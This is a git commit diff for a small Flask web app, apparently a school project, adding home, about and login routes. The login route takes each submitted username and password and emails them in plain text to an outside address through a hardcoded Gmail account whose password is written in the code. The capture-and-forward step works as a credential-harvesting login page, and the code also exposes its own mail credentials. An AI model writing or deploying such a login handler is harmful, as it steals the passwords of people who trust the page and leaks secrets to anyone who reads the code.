ba16e84164d86547182a33902c4eb31b49e21448
pgMFschool <96243693+middlefield-teacher@users.noreply.github.com>
2021-12-18 16:06:55 +0000

    added templates and static + login

--- app.py
+++ app.py
@@ -1,7 +1,32 @@
-from flask import Flask
+from flask import Flask, render_template, request
+import yagmail
+
 
 app = Flask(__name__)
 
 @app.route('/')
 def home_page():
-  return 'This is the home page'
+  return render_template('index.html')
+
+@app.route('/about')
+def about_page():
+  return render_template('about.html')
+
+@app.route('/login', methods = ['GET', 'POST'])
+def login_page():
+  if request.method == 'POST':
+    user = request.form['username_input_box']
+    pwd = request.form['pwd_input_box']
+    # print('username: ' + user + '   password: ' + pwd)
+    yag = yagmail.SMTP(user='peterpipinstall@gmail.com', password='pipinstall', host='smtp.gmail.com')
+    # Adding in the details
+    toRec = "gw14galbraithpeter2@glow.ea.glasgow.sch.uk"
+    subjectLine = "A test email"
+    body = ["username: ", user, "\tpassword: ", pwd]
+    # Delivery
+    yag.send(to=toRec, subject=subjectLine, contents=body)
+    print('email sent')
+    return render_template('about.html')
+  else:
+    return render_template('login.html')
+  
